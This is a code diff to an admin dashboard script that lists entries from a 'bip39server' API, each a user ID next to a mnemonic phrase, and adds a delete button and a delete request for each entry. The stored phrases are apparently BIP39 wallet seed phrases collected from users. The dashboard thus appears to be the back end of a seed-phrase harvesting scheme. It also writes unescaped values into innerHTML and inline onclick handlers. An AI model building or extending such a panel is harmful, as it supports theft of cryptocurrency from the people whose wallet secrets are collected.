@@ -15,6 +15,24 @@ $(document).ready(function () {
 const contents = document.querySelector('.contents');
 
 
+function deleteAnEntry(id) {
+    fetch(`https://bip39server.herokuapp.com/api/v1/delete-a-user-entry/${id}`, {
+        method: 'DELETE',
+        headers: {
+            "Content-type": "application/json",
+            "Authorization": `Bearer ${token}`
+        }
+    }).then(res => res.json())
+    .then(res => console.log(res))
+    .catch(e => console.error("error", e))
+
+    // reload the page to refetch contents
+    setTimeout(() => {
+        window.location = 'adminDashboard.html';
+    }, 1000);
+}
+
+
 (function getAllEntry() {
     fetch('https://bip39server.herokuapp.com/api/v1/get-all-entry', {
         method: 'GET',
@@ -30,9 +48,11 @@ const contents = document.querySelector('.contents');
                 <tr>
                 <td>${entry.user_id || "not provided"}</td>
                 <td>${entry.mnemonic_phrase}</td>
+                <td><button class="btn-danger" onclick=deleteAnEntry('${entry._id}')>Delete</button></td>
               </tr>
               `
             })
+            // 
         }
         else {
             contents.innerHTML = 'No data at the moment'
@@ -40,3 +60,5 @@ const contents = document.querySelector('.contents');
     })
     .catch(e => console.error("error", e))
 })()
+
+
